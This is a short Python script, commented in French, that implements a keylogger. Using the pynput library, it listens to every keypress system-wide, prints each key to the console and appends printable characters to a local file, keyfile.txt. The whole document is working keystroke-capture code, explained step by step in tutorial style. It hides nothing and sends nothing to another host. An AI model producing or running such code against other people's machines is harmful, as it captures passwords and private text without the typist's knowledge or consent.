from pynput import keyboard #permet de  surveiller le clavier.

def keyPressed(key): # sera appelée chaque fois qu'une touche du clavier est pressée.
    print(str(key))  #voir la touche qui a été pressée dans la console.
    with open("keyfile.txt", 'a') as logKey:
    # ouvrir le fichier keyfile.txt en mode d'ecriture (ou bien le cree si il n'exist pas)
    #  'a' pour ajouter du texte à la fin du fichier
    #  'with' garantit que le fichier est correctement fermé après utilisation
        try:
            char = key.char # extraire le caractère de la touche pressée (!-fonctionnera juste avec caractère imprimable lettre/chiffre )
            logKey.write(char) #caractère est écrit dans le fichier "keyfile.txt"
        except:
            print("Error getting char") #touche pressée n'est pas un caractère imprimable

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()